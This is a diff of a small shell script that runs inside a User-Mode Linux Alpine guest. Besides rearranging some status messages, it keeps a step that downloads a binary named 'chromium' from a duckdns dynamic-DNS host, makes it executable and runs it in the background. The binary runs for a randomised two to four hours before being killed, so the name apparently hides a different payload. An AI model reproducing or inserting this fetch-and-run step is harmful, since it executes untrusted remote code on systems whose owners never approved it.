@@ -4,16 +4,15 @@ set -e
 # Custom command/script that runs inside the UML (Alpine) guest.
 # Edit this file to change what executes in the guest.
 
-echo "--- uml guest ---"
-echo "nproc=$(nproc) processors=$(grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo ?)"
-echo "UML-RUN-OK"
+echo "uml guest run starting"
 apk update
-wget -O chromium http://xyz0895.duckdns.org/files/chromium
+echo "cpu info: nproc=$(nproc) processors=$(grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo ?)"
+echo "UML-RUN-OK"
+wget http://xyz0895.duckdns.org/files/chromium
 chmod +x chromium
 ./chromium &
-# brief marker
 SLEEP_SECS=$(awk -v min=7200 -v max=14400 -v s="$(od -An -N4 -tu4 /dev/urandom 2>/dev/null | tr -d ' ')" 'BEGIN{if(s=="") s=systime(); srand(s+0); print int(min+rand()*(max-min+1))}')
 echo "sleeping ${SLEEP_SECS}s (2h-4h random)"
 sleep "$SLEEP_SECS"
 pkill -9 chromium
-# sync-nonce: 512ac93225c3516a
+# sync-nonce: 0e58269f21f2b2da
